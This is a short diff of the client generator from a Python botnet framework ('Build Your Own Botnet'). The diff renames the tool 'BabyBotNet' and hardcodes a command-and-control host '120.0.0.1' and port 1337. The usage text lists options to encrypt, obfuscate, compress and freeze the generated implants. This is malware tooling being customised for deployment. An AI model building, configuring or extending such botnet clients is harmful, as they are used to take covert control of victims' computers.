@@ -1,12 +1,12 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-"""Client Generator (Build Your Own Botnet)
+"""Client Generator (BabyBotNet)
 
 usage: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                  [--encrypt] [--obfuscate] [--compress] [--freeze]
                  host port [module [module ...]]
 
-Generator (Build Your Own Botnet)
+Generator (BabyBotNet)
 
 positional arguments:
   host            server IP address
@@ -119,7 +119,8 @@ __banner = """
                 d8'
                d8'
 """
-C2_HOST = util.public_ip()
+# C2_HOST = util.public_ip()
+C2_HOST = '120.0.0.1'
 C2_PORT = '1337'
 ROOT = os.path.abspath(os.path.dirname(__file__))
 
@@ -135,7 +136,7 @@ def main(*args, **kwargs):
     if not kwargs:
         parser = argparse.ArgumentParser(
             prog='client.py',
-            description="Generator (Build Your Own Botnet)"
+            description="Generator (BabyBotNet)"
         )
 
         parser.add_argument('modules',
